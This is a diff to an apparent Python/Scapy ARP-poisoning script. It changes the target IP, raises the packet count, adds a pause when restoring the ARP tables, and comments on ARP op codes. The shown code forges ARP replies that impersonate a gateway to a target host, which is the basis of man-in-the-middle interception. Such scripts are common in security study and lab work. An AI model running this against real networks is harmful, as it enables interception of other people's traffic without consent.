@@ -4,9 +4,9 @@ import sys
 import threading
 
 interface = "enp8s0"
-target_ip = "192.168.13.195"
+target_ip = "192.168.13.216"
 gateway_ip = "192.168.13.253"
-packet_count = 1000
+packet_count = 10000
 poisoning = True
 
 
@@ -16,6 +16,7 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     #psrc = sender ip , pdst = target ip
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
+    time.sleep(1)
 
 
 def get_mac(ip_address):
@@ -32,7 +33,7 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     global poisoning
 
     poison_target = ARP()
-    poison_target.op = 2
+    poison_target.op = 2 #op=2 ---------is at ,op1 = who has
     poison_target.psrc = gateway_ip
     poison_target.pdst = target_ip
     poison_target.hwdst = target_mac
